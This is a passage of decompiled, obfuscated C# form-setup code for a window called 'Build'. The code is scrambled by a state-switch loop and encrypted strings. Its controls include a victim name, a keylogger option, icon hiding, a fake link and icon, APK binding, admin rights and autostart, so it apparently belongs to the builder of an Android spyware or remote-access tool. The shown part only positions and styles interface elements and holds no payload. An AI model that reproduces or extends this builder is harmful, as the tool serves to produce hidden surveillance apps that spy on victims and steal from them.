          case 265:
            ((Build) this).Label9.ForeColor = Color.White;
            num1 = (int) num2 * 1191994212 ^ -2113785345;
            continue;
          case 266:
            ((Build) this).logtitletext.ForeColor = Color.White;
            ((Build) this).logtitletext.Location = new Point(355, 30);
            num1 = (int) num2 * -304132615 ^ 74429673;
            continue;
          case 267:
            ((Build) this).CheckBIND.Name = EXGuarder.\u0034E40305F;
            num1 = (int) num2 * -192455340 ^ -587045487;
            continue;
          case 268:
            ((Build) this).explainmonitortext.Dock = DockStyle.Fill;
            ((Build) this).explainmonitortext.Font = new Font(EXGuarder.\u00339780D77, 11f);
            num1 = (int) num2 * 1337415593 ^ 748708475;
            continue;
          case 269:
            ((Build) this).explaintoolstext.Multiline = true;
            ((Build) this).explaintoolstext.Name = EXGuarder.\u0031A296002;
            num1 = (int) num2 * 133492065 ^ -352438592;
            continue;
          case 270:
            ((Build) this).TabPage11.Name = EXGuarder.\u0035A79680C;
            num1 = (int) num2 * -1640017618 ^ -669984800;
            continue;
          case 271:
            ((Build) this).Label48.Dock = DockStyle.Left;
            num1 = (int) num2 * -1343426965 ^ 145430760;
            continue;
          case 272:
            ((Build) this).Label11.Size = new Size(16, 19);
            num1 = (int) num2 * -556056265 ^ 164581445;
            continue;
          case 273:
            ((Build) this).comboproms.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).comboproms.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -753407336 ^ 1903221727;
            continue;
          case 274:
            ((Build) this).Label5.Size = new Size(64, 24);
            num1 = (int) num2 * 203814296 ^ 2053755711;
            continue;
          case 275:
            ((ISupportInitialize) ((Build) this).PictureBox1).EndInit();
            ((Build) this).TabPage9.ResumeLayout(false);
            ((Build) this).Panel3.ResumeLayout(false);
            ((Build) this).Panel3.PerformLayout();
            num1 = (int) num2 * 1318070251 ^ 1412956206;
            continue;
          case 276:
            ((Build) this).combotype.Size = new Size(123, 25);
            num1 = (int) num2 * -1507270059 ^ 1479234289;
            continue;
          case 277:
            ((Build) this).idmonitor.Size = new Size(262, 27);
            ((Build) this).idmonitor.Style = UIStyle.Custom;
            num1 = (int) num2 * -1147092552 ^ 1452087783;
            continue;
          case 278:
            ((Build) this).trgtbkg = new DrakeUITextBox();
            ((Build) this).Label41 = new Label();
            num1 = (int) num2 * -52714785 ^ -374485272;
            continue;
          case 279:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).keeplivelabel);
            num1 = (int) num2 * 1517092555 ^ -1938834863;
            continue;
          case 280:
            ((Build) this).Notmsg.Size = new Size(327, 27);
            ((Build) this).Notmsg.TabIndex = 42;
            num1 = (int) num2 * -466359839 ^ 2021603156;
            continue;
          case 281:
            ((Build) this).MainText = new Label();
            ((Build) this).CheckHide = new DrakeUICheckBox();
            ((Build) this).CheckIconPatch = new DrakeUICheckBox();
            num1 = (int) num2 * 644768226 ^ 687372397;
            continue;
          case 282:
            ((Build) this).TextNameVictim.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 914877910 ^ -444480561;
            continue;
          case 283:
            ((Build) this).Label16.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * 1891673863 ^ -280579060;
            continue;
          case 284:
            ((Build) this).Panel4.Controls.Add((Control) ((Build) this).Nottitle);
            num1 = (int) num2 * 422230568 ^ -805035855;
            continue;
          case 285:
            ((Build) this).TextPackage.FillColor = Color.Black;
            num1 = (int) num2 * -1042356592 ^ 1130436237;
            continue;
          case 286:
            ((Build) this).TabPage10.Controls.Add((Control) ((Build) this).Panel2);
            num1 = (int) num2 * -902272536 ^ -48403892;
            continue;
          case 287:
            ((Build) this).Panel3.Location = new Point(0, 0);
            num1 = (int) num2 * -1463686936 ^ 894002610;
            continue;
          case 288:
            ((Build) this).Label7.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 2138898303 ^ -1723248138;
            continue;
          case 289:
            ((Build) this).checkkeyloger.Text = EXGuarder.\u0036079355E;
            ((Build) this).CheckQuick.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 1361252140 ^ -1915261944;
            continue;
          case 290:
            ((Build) this).TabPage13.BackColor = Color.White;
            num1 = (int) num2 * -2057291113 ^ -764440150;
            continue;
          case 291:
            ((Build) this).Panel6.Dock = DockStyle.Fill;
            num1 = (int) num2 * 664260782 ^ 2029607475;
            continue;
          case 292:
            ((Build) this).box = new Panel();
            num1 = (int) num2 * 409474585 ^ 205837621;
            continue;
          case 293:
            ((Build) this).Panel7 = new Panel();
            ((Build) this).panelmonitorb = new Panel();
            ((Build) this).explainmonitortext = new TextBox();
            num1 = (int) num2 * 506301229 ^ 1125581096;
            continue;
          case 294:
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).Label29);
            num1 = (int) num2 * 275105188 ^ -1058090206;
            continue;
          case 295:
            ((Build) this).logtitletext.BorderStyle = BorderStyle.FixedSingle;
            num1 = (int) num2 * 243319764 ^ 1876592651;
            continue;
          case 296:
            ((Build) this).SelectedApk.BackColor = Color.Transparent;
            ((Build) this).SelectedApk.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1525305718 ^ 2142397043;
            continue;
          case 297:
            ((Build) this).Checksuper.Name = EXGuarder.\u0035A05094B;
            ((Build) this).Checksuper.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -834643675 ^ 479955228;
            continue;
          case 298:
            ((Build) this).Primslist.Location = new Point(16, 97);
            ((Build) this).Primslist.Margin = new Padding(4, 5, 4, 5);
            ((Build) this).Primslist.Name = EXGuarder.\u0035B766A23;
            num1 = (int) num2 * 9223825 ^ 708963106;
            continue;
          case 299:
            ((Build) this).CheckAllPrims.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 77992473 ^ -1009188666;
            continue;
          case 300:
            ((Build) this).Label43.Size = new Size(19, 24);
            num1 = (int) num2 * 1936986536 ^ -971694188;
            continue;
          case 301:
            ((Build) this).CheckSkipre.TabIndex = 97;
            ((Build) this).CheckSkipre.Text = EXGuarder.\u00322174B78;
            num1 = (int) num2 * -1142669856 ^ 1577619474;
            continue;
          case 302:
            ((Build) this).TextNameVictim.Location = new Point(102, 258);
            ((Build) this).TextNameVictim.Margin = new Padding(5, 6, 5, 6);
            ((Build) this).TextNameVictim.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * 1352288258 ^ 95392498;
            continue;
          case 303:
            ((Build) this).po.Size = new Size(262, 27);
            num1 = (int) num2 * 585386451 ^ 613115780;
            continue;
          case 304:
            ((Build) this).bindbodytext.Name = EXGuarder.\u00353586067;
            num1 = (int) num2 * -1508090776 ^ 1507111712;
            continue;
          case 305:
            ((Build) this).Panel8.SuspendLayout();
            num1 = (int) num2 * -367097782 ^ 543398446;
            continue;
          case 306:
            ((Build) this).Panel8.Name = EXGuarder.\u003230A511F;
            num1 = (int) num2 * -1365820191 ^ -1518231762;
            continue;
          case 307:
            ((Build) this).Label44.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label44.Name = EXGuarder.\u0035A2F5328;
            ((Build) this).Label44.Size = new Size(156, 24);
            num1 = (int) num2 * 1465577138 ^ 1724960778;
            continue;
          case 308:
            ((Build) this).CheckHide.TabIndex = 77;
            num1 = (int) num2 * 606926702 ^ 1172093540;
            continue;
          case 309:
            ((Build) this).Textfakelink.Cursor = Cursors.IBeam;
            ((Build) this).Textfakelink.FillColor = Color.Black;
            num1 = (int) num2 * -2012093692 ^ -758912475;
            continue;
          case 310:
            ((Build) this).TextVersion.Minimum = (double) int.MinValue;
            num1 = (int) num2 * 1723935130 ^ -1699604466;
            continue;
          case 311:
            ((Build) this).Primslist.StyleCustomMode = true;
            num1 = (int) num2 * -1595418565 ^ 148063711;
            continue;
          case 312:
            ((Build) this).checkautostart = new DrakeUICheckBox();
            ((Build) this).Label34 = new Label();
            ((Build) this).Label43 = new Label();
            num1 = (int) num2 * 682650061 ^ 137917952;
            continue;
          case 313:
            ((Build) this).Label37.AutoSize = true;
            ((Build) this).Label37.BackColor = Color.Transparent;
            ((Build) this).Label37.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label37.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1503088721 ^ -62319106;
            continue;
          case 314:
            ((Build) this).checkver.Items.AddRange(new object[2]
            {
              (object) EXGuarder.\u0034404423C,
              (object) EXGuarder.\u00361740915
            });
            num1 = (int) num2 * 1386804062 ^ -96492419;
            continue;
          case 315:
            ((Build) this).checkcatpure = new DrakeUICheckBox();
            num1 = (int) num2 * 1411156085 ^ -795963825;
            continue;
          case 316:
            ((Build) this).sizelabel.Size = new Size(81, 24);
            num1 = (int) num2 * -615551397 ^ -865887081;
            continue;
          case 317:
            ((Build) this).Label5.Location = new Point(1156, 331);
            num1 = (int) num2 * -1812502549 ^ 1086665112;
            continue;
          case 318:
            ((Build) this).addactiv.Size = new Size(35, 30);
            ((Build) this).addactiv.Style = UIStyle.Custom;
            num1 = (int) num2 * -1830074471 ^ -122945840;
            continue;
          case 319:
            ((Build) this).checkver.ItemHeight = 20;
            num1 = (int) num2 * -1690068695 ^ -745391702;
            continue;
          case 320:
            ((Build) this).po.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).po.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1256734875 ^ 698014784;
            continue;
          case 321:
            ((Build) this).Label10.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label10.Location = new Point(574, 88);
            ((Build) this).Label10.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -2067056613 ^ -1017534875;
            continue;
          case 322:
            ((Build) this).Button3.FlatStyle = FlatStyle.Flat;
            ((Build) this).Button3.Font = new Font(EXGuarder.\u00339780D77, 10f, FontStyle.Bold);
            num1 = (int) num2 * -308362478 ^ -2024510289;
            continue;
          case 323:
            ((Build) this).dscriptext = new TextBox();
            ((Build) this).Label29 = new Label();
            num1 = (int) num2 * -934392762 ^ 1832823005;
            continue;
          case 324:
            ((Build) this).delaylabelaccess.AutoSize = true;
            ((Build) this).delaylabelaccess.BackColor = Color.Transparent;
            ((Build) this).delaylabelaccess.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).delaylabelaccess.ForeColor = Color.White;
            ((Build) this).delaylabelaccess.Location = new Point(124, 491);
            ((Build) this).delaylabelaccess.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 714251860 ^ 1595248267;
            continue;
          case 325:
            ((Build) this).Label19.TabIndex = 60;
            num1 = (int) num2 * 185979771 ^ 760058755;
            continue;
          case 326:
            ((Build) this).namemonitor.Location = new Point(95, 147);
            num1 = (int) num2 * 1279426409 ^ -1844317757;
            continue;
          case 327:
            ((Build) this).TextNamePatch.Watermark = EXGuarder.\u0033476260C;
            ((Build) this).po.Cursor = Cursors.IBeam;
            ((Build) this).po.FillColor = Color.Black;
            ((Build) this).po.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1468305720 ^ 82209165;
            continue;
          case 328:
            ((Build) this).Label40.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1275126812 ^ -398604769;
            continue;
          case 329:
            ((Build) this).keeplivelabel.Size = new Size(98, 24);
            num1 = (int) num2 * -54587307 ^ 479329483;
            continue;
          case 330:
            ((Build) this).removmonitor.Location = new Point(390, 277);
            num1 = (int) num2 * -1279873029 ^ -1766911229;
            continue;
          case 331:
            ((Build) this).removeactiv.AvatarSize = 30;
            ((Build) this).removeactiv.BackColor = Color.Transparent;
            num1 = (int) num2 * 17205419 ^ -1901165934;
            continue;
          case 332:
            ((Build) this).Label9.Location = new Point(161, 354);
            num1 = (int) num2 * -1939936718 ^ -593655059;
            continue;
          case 333:
            ((Build) this).addmintor.Text = EXGuarder.\u00373182D5A;
            num1 = (int) num2 * -547628075 ^ -1474776970;
            continue;
          case 334:
            ((Build) this).Label25.Name = EXGuarder.\u00344736F3C;
            ((Build) this).Label25.Size = new Size(133, 17);
            num1 = (int) num2 * 476888442 ^ 363691320;
            continue;
          case 335:
            ((Build) this).PictureBox2.TabIndex = 34;
            ((Build) this).PictureBox2.TabStop = false;
            num1 = (int) num2 * 1275037177 ^ -638765176;
            continue;
          case 336:
            ((Build) this).Button1.FillPressColor = Color.Black;
            num1 = (int) num2 * -1576648503 ^ -749744550;
            continue;
          case 337:
            ((Build) this).linkmonitor.Location = new Point(95, 235);
            ((Build) this).linkmonitor.Margin = new Padding(5, 6, 5, 6);
            ((Build) this).linkmonitor.Maximum = (double) int.MaxValue;
            ((Build) this).linkmonitor.Minimum = (double) int.MinValue;
            num1 = (int) num2 * 1625553936 ^ -1232709804;
            continue;
          case 338:
            ((Build) this).combotype = new DrakeUIComboBox();
            ((Build) this).Label20 = new Label();
            num1 = (int) num2 * 722855126 ^ 492706887;
            continue;
          case 339:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).Label4);
            num1 = (int) num2 * 172296735 ^ 1855949468;
            continue;
          case 340:
            ((Build) this).TextNameVictim.FillColor = Color.Black;
            num1 = (int) num2 * -1448374631 ^ 68191749;
            continue;
          case 341:
            ((Build) this).delayaccesstext.Text = EXGuarder.\u0035E257121;
            num1 = (int) num2 * -891775645 ^ 788436989;
            continue;
          case 342:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).tracklist);
            num1 = (int) num2 * -941498854 ^ -1670370934;
            continue;
          case 343:
            ((Build) this).Label10.Size = new Size(16, 19);
            ((Build) this).Label10.TabIndex = 98;
            num1 = (int) num2 * 194336737 ^ -1327434716;
            continue;
          case 344:
            ((Build) this).removeactiv.Text = EXGuarder.\u00373182D5A;
            num1 = (int) num2 * 632138453 ^ 944192794;
            continue;
          case 345:
            ((Build) this).Label38.Name = EXGuarder.\u0037862260B;
            num1 = (int) num2 * 1356529754 ^ -204911166;
            continue;
          case 346:
            ((Build) this).Label4.TabIndex = 28;
            num1 = (int) num2 * 2069230796 ^ 1940387843;
            continue;
          case 347:
            ((Build) this).checkver.CausesValidation = false;
            num1 = (int) num2 * -612643237 ^ -1488263938;
            continue;
          case 348:
            ((Build) this).CheckQuick.Location = new Point(83, 60);
            num1 = (int) num2 * 2045548552 ^ 807766479;
            continue;
          case 349:
            ((Build) this).Label5.ForeColor = Color.White;
            num1 = (int) num2 * 1857970595 ^ -1262868861;
            continue;
          case 350:
            ((Build) this).randomidbtn.Size = new Size(35, 30);
            num1 = (int) num2 * 1656082529 ^ 1403511373;
            continue;
          case 351:
            ((Build) this).fakepanel.PerformLayout();
            ((ISupportInitialize) ((Build) this).fakeiconpic).EndInit();
            num1 = (int) num2 * -1216251809 ^ -1914122992;
            continue;
          case 352:
            ((Build) this).Label24.AutoSize = true;
            num1 = (int) num2 * -326739541 ^ 1255084701;
            continue;
          case 353:
            ((Build) this).Nottitle.BorderStyle = BorderStyle.FixedSingle;
            ((Build) this).Nottitle.ForeColor = Color.White;
            ((Build) this).Nottitle.Location = new Point(184, 111);
            ((Build) this).Nottitle.Margin = new Padding(4);
            num1 = (int) num2 * 598786327 ^ 1505110594;
            continue;
          case 354:
            ((Build) this).Label47.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label47.Name = EXGuarder.\u0033972234F;
            ((Build) this).Label47.Size = new Size(82, 24);
            num1 = (int) num2 * -668537990 ^ 1743066716;
            continue;
          case 355:
            ((Build) this).checkadmin.TabIndex = 86;
            ((Build) this).checkadmin.Text = EXGuarder.\u0031D213867;
            ((Build) this).checkautostart.CheckBoxColor = Color.FromArgb(30, 136, 229);
            ((Build) this).checkautostart.Cursor = Cursors.Hand;
            num1 = (int) num2 * 360788659 ^ 1226799227;
            continue;
          case 356:
            ((Build) this).CheckDraw.Location = new Point(83, 95);
            num1 = (int) num2 * 946387472 ^ -324140954;
            continue;
          case 357:
            ((Build) this).CheckAllPrims = new DrakeUICheckBox();
            num1 = (int) num2 * -938445775 ^ -1309689928;
            continue;
          case 358:
            ((Build) this).trgtbkg.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 1954369945 ^ -676341432;
            continue;
          case 359:
            ((Build) this).po.Minimum = (double) int.MinValue;
            num1 = (int) num2 * -1607948041 ^ -1982612443;
            continue;
          case 360:
            ((Build) this).checkver.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -787957467 ^ 1878682369;
            continue;
          case 361:
            ((Build) this).Label49.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label49.Name = EXGuarder.\u0033E270867;
            ((Build) this).Label49.Size = new Size(16, 19);
            num1 = (int) num2 * -908178974 ^ -2072285771;
            continue;
          case 362:
            ((Build) this).checksignver.Items.AddRange(new object[2]
            {
              (object) EXGuarder.\u0034404423C,
              (object) EXGuarder.\u00361740915
            });
            num1 = (int) num2 * 134502927 ^ 418017753;
            continue;
          case 363:
            ((Build) this).TiMAT = new Timer(((Build) this).components);
            num1 = (int) num2 * 1438917011 ^ -794162131;
            continue;
          case 364:
            ((Build) this).checkprotector.Style = UIStyle.Custom;
            num1 = (int) num2 * -1183221096 ^ 905978024;
            continue;
          case 365:
            ((Build) this).Panel1 = new Panel();
            ((Build) this).checkprotector = new DrakeUICheckBox();
            num1 = (int) num2 * 1327078545 ^ -307143189;
            continue;
          case 366:
            ((Build) this).TabPage11.TabIndex = 3;
            num1 = (int) num2 * -369375585 ^ -573507467;
            continue;
          case 367:
            ((Build) this).Panel3.BackColor = Color.Black;
            num1 = (int) num2 * -1910697438 ^ -252445261;
            continue;
          case 368:
            ((Build) this).CheckHidePrims = new DrakeUICheckBox();
            num1 = (int) num2 * 1368730960 ^ -481989614;
            continue;
          case 369:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).CheckIconPatch);
            num1 = (int) num2 * 314773903 ^ 1877916455;
            continue;
          case 370:
            ((Build) this).addmintor.FillColor = Color.Transparent;
            num1 = (int) num2 * -1010136723 ^ -1081065033;
            continue;
          case 371:
            ((Build) this).listmonitor.ItemSelectForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 350952369 ^ 710859307;
            continue;
          case 372:
            ((Build) this).sizelabel.TabIndex = 48;
            num1 = (int) num2 * 856223695 ^ -1338448678;
            continue;
          case 373:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).fakepanel);
            num1 = (int) num2 * -2025123899 ^ 1522339116;
            continue;
          case 374:
            ((Build) this).Panel2.Margin = new Padding(4, 5, 4, 5);
            ((Build) this).Panel2.Name = EXGuarder.\u0036A72671C;
            ((Build) this).Panel2.Size = new Size(1004, 677);
            num1 = (int) num2 * -1553462917 ^ 951431587;
            continue;
          case 375:
            ((Build) this).combotype.AllowDrop = true;
            ((Build) this).combotype.BackColor = Color.Transparent;
            ((Build) this).combotype.CausesValidation = false;
            num1 = (int) num2 * 1026251595 ^ 1526125206;
            continue;
          case 376:
            ((Build) this).TabPage12.Size = new Size(450, 230);
            ((Build) this).TabPage12.TabIndex = 4;
            num1 = (int) num2 * 203441230 ^ 925943430;
            continue;
          case 377:
            ((Build) this).logbodytext = new TextBox();
            num1 = (int) num2 * 1722131694 ^ 1505489076;
            continue;
          case 378:
            ((Build) this).box.Location = new Point(0, 0);
            ((Build) this).box.Margin = new Padding(4, 5, 4, 5);
            ((Build) this).box.Name = EXGuarder.\u0036D27374E;
            ((Build) this).box.Size = new Size(1006, 734);
            ((Build) this).box.TabIndex = 11;
            num1 = (int) num2 * -384352101 ^ 273130803;
            continue;
          case 379:
            ((Build) this).trakertitle = new Label();
            num1 = (int) num2 * -853220069 ^ 1861883003;
            continue;
          case 380:
            ((Build) this).Label4.Text = EXGuarder.\u0031D096241;
            num1 = (int) num2 * -628307450 ^ -520432067;
            continue;
          case 381:
            ((Build) this).keeplivelabel.Name = EXGuarder.\u00359525103;
            num1 = (int) num2 * 263619744 ^ 1886436902;
            continue;
          case 382:
            ((Build) this).Panel9.SuspendLayout();
            num1 = (int) num2 * -1361855470 ^ 1254110178;
            continue;
          case 383:
            ((Build) this).removmonitor = new DrakeUIAvatar();
            ((Build) this).addmintor = new DrakeUIAvatar();
            ((Build) this).listmonitor = new DrakeUIListBox();
            num1 = (int) num2 * 330345909 ^ 98135578;
            continue;
          case 384:
            ((Build) this).po.ForeColor = Color.White;
            ((Build) this).po.Location = new Point(615, 108);
            ((Build) this).po.Margin = new Padding(5, 6, 5, 6);
            ((Build) this).po.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * -1262925727 ^ -106419538;
            continue;
          case 385:
            ((Build) this).TABCTRL.Controls.Add((Control) ((Build) this).TabPage9);
            num1 = (int) num2 * 2075419476 ^ 1172150976;
            continue;
          case 386:
            ((Build) this).Nottitle = new TextBox();
            num1 = (int) num2 * -302088253 ^ -831553125;
            continue;
          case 387:
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).logtitletext);
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).PictureBox2);
            num1 = (int) num2 * 2145901547 ^ 1959214737;
            continue;
          case 388:
            ((Build) this).listmonitor.Text = (string) null;
            num1 = (int) num2 * -126222449 ^ 1696671300;
            continue;
          case 389:
            ((Build) this).PictureBox1.Location = new Point(423, 506);
            num1 = (int) num2 * 833600851 ^ 261132583;
            continue;
          case 390:
            ((Build) this).DrakeUIAvatar1.Cursor = Cursors.Hand;
            ((Build) this).DrakeUIAvatar1.FillColor = Color.Transparent;
            num1 = (int) num2 * -1475995820 ^ 400850035;
            continue;
          case 391:
            ((Build) this).Label39.TabIndex = 0;
            num1 = (int) num2 * -1796781956 ^ -1485936072;
            continue;
          case 392:
            ((Build) this).Label26.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1188931469 ^ 573198911;
            continue;
          case 393:
            ((Build) this).Label36.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label36.Name = EXGuarder.\u003130A0123;
            ((Build) this).Label36.Size = new Size(16, 19);
            ((Build) this).Label36.TabIndex = 104;
            num1 = (int) num2 * 802534068 ^ -1868135013;
            continue;
          case 394:
            ((Build) this).keeplivelabel.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1518678110 ^ -2117894748;
            continue;
          case 395:
            ((Build) this).Label27.Size = new Size(113, 24);
            ((Build) this).Label27.TabIndex = 44;
            ((Build) this).Label27.Text = EXGuarder.\u003141F2110;
            ((Build) this).fakeiconpic.BackColor = Color.FromArgb(45, 45, 45);
            ((Build) this).fakeiconpic.Location = new Point(323, 199);
            ((Build) this).fakeiconpic.Margin = new Padding(4);
            num1 = (int) num2 * 638280531 ^ -1388195939;
            continue;
          case 396:
            ((Build) this).linkmonitor.ForeColor = Color.White;
            num1 = (int) num2 * -2821270 ^ 464875060;
            continue;
          case 397:
            ((Build) this).listmonitor.StyleCustomMode = true;
            ((Build) this).listmonitor.TabIndex = 97;
            num1 = (int) num2 * 1452894064 ^ -1132691611;
            continue;
          case 398:
            ((Build) this).SelectedApk.RectHoverColor = Color.White;
            ((Build) this).SelectedApk.RectPressColor = Color.White;
            num1 = (int) num2 * 85500376 ^ 781917630;
            continue;
          case 399:
            ((Build) this).fakeiconpic.TabStop = false;
            num1 = (int) num2 * 456904490 ^ 1972187481;
            continue;
          case 400:
            ((Build) this).sizelabel = new Label();
            num1 = (int) num2 * -182416727 ^ 468391393;
            continue;
          case 401:
            ((ISupportInitialize) ((Build) this).PictureBox2).EndInit();
            num1 = (int) num2 * 1382221872 ^ 177713474;
            continue;
          case 402:
            ((Build) this).CheckBIND.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1796995129 ^ 1727952775;
            continue;
          case 403:
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).Label31);
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).Label32);
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).Button3);
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).logbodytext);
            num1 = (int) num2 * 1501735594 ^ -1167803442;
            continue;
          case 404:
            ((Build) this).TextBox1.Dock = DockStyle.Fill;
            num1 = (int) num2 * -33800349 ^ -1189981378;
            continue;
          case 405:
            ((Build) this).checknetwork.Text = EXGuarder.\u0036D71046B;
            num1 = (int) num2 * -970377811 ^ 1815019783;
            continue;
          case 406:
            ((Build) this).namemonitor.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * -1409905334 ^ -1701819826;
            continue;
          case 407:
            ((Build) this).TABCTRL.Controls.Add((Control) ((Build) this).TabPage11);
            ((Build) this).TABCTRL.Controls.Add((Control) ((Build) this).TabPage12);
            ((Build) this).TABCTRL.Controls.Add((Control) ((Build) this).TabPage13);
            num1 = (int) num2 * -1880865758 ^ -1168353361;
            continue;
          case 408:
            ((Build) this).checkautostart.Style = UIStyle.Custom;
            num1 = (int) num2 * 1401078694 ^ 1129663744;
            continue;
          case 409:
            ((Build) this).checkkeyloger.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 918652164 ^ 727357015;
            continue;
          case 410:
            ((Build) this).Nottitle.Name = EXGuarder.\u00328446A46;
            ((Build) this).Nottitle.Size = new Size(327, 27);
            num1 = (int) num2 * -1890958442 ^ 130579387;
            continue;
          case 411:
            ((Build) this).namemonitor.Style = UIStyle.Custom;
            ((Build) this).namemonitor.TabIndex = 94;
            ((Build) this).namemonitor.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * -214025631 ^ -794681774;
            continue;
          case 412:
            ((Build) this).trackIDtext.TabIndex = 105;
            num1 = (int) num2 * 1689175481 ^ 1969396674;
            continue;
          case 413:
            ((Build) this).Label2.ForeColor = Color.White;
            ((Build) this).Label2.Location = new Point(159, 221);
            ((Build) this).Label2.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label2.Name = EXGuarder.\u003742A0D6E;
            ((Build) this).Label2.Size = new Size(113, 24);
            num1 = (int) num2 * 1670463403 ^ 159576971;
            continue;
          case 414:
            ((Build) this).Label15.BackColor = Color.Transparent;
            num1 = (int) num2 * 1740141339 ^ -1956644777;
            continue;
          case 415:
            ((Build) this).Label15.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * 1309411478 ^ 720410331;
            continue;
          case 416:
            ((Build) this).TabPage14.PerformLayout();
            ((Build) this).Panel9.ResumeLayout(false);
            ((Build) this).Panel9.PerformLayout();
            ((Build) this).Panel8.ResumeLayout(false);
            ((Build) this).Panel1.ResumeLayout(false);
            this.ResumeLayout(false);
            num1 = (int) num2 * 452369814 ^ 338578148;
            continue;
          case 417:
            ((Build) this).MainText.BackColor = Color.Transparent;
            ((Build) this).MainText.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).MainText.ForeColor = Color.White;
            num1 = (int) num2 * -143538874 ^ 598490487;
            continue;
          case 418:
            ((Build) this).po.Radius = 10;
            num1 = (int) num2 * -2140717583 ^ -1270164585;
            continue;
          case 419:
            ((Build) this).Label19.BackColor = Color.Transparent;
            num1 = (int) num2 * -1421655953 ^ -1533856734;
            continue;
          case 420:
            ((Build) this).checknetwork.Style = UIStyle.Custom;
            num1 = (int) num2 * -1963656135 ^ -1096501511;
            continue;
          case 421:
            ((Build) this).addactiv.Symbol = 61525;
            num1 = (int) num2 * 1178097697 ^ 1410455392;
            continue;
          case 422:
            ((Build) this).randomverbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * -225858709 ^ 186296744;
            continue;
          case 423:
            ((Build) this).Panel9.Size = new Size(326, 163);
            ((Build) this).Panel9.TabIndex = 105;
            num1 = (int) num2 * 985728660 ^ -1053578472;
            continue;
          case 424:
            ((Build) this).Panel6.Location = new Point(0, 0);
            num1 = (int) num2 * 1493344742 ^ -785997448;
            continue;
          case 425:
            ((Build) this).Label17.TabIndex = 36;
            ((Build) this).Label17.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * 1119989242 ^ 227328811;
            continue;
          case 426:
            ((Build) this).tracklist.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 909421547 ^ 640298827;
            continue;
          case 427:
            ((Build) this).TabPage13.Controls.Add((Control) ((Build) this).Panel7);
            num1 = (int) num2 * -524090978 ^ -2098606652;
            continue;
          case 428:
            ((Build) this).checkver.Margin = new Padding(4);
            num1 = (int) num2 * -1280880609 ^ -1853222644;
            continue;
          case 429:
            ((Build) this).TabPage13.Text = EXGuarder.\u00368164F45;
            num1 = (int) num2 * 760786347 ^ -183206158;
            continue;
          case 430:
            ((Build) this).Label14.TabIndex = 54;
            ((Build) this).Label14.Text = EXGuarder.\u003500A6952;
            ((Build) this).Label6.AutoSize = true;
            ((Build) this).Label6.BackColor = Color.Transparent;
            num1 = (int) num2 * -971315098 ^ 2097735316;
            continue;
          case 431:
            ((Build) this).PictureBox2.Size = new Size(488, 513);
            ((Build) this).PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * 576216329 ^ 1859477977;
            continue;
          case 432:
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).Label26);
            num1 = (int) num2 * -94024350 ^ 758907624;
            continue;
          case 433:
            ((Build) this).Label32.Size = new Size(121, 24);
            num1 = (int) num2 * 1527276790 ^ -1960064875;
            continue;
          case 434:
            ((Build) this).CheckDraw.Padding = new Padding(22, 0, 0, 0);
            ((Build) this).CheckDraw.Size = new Size(338, 29);
            ((Build) this).CheckDraw.Style = UIStyle.Custom;
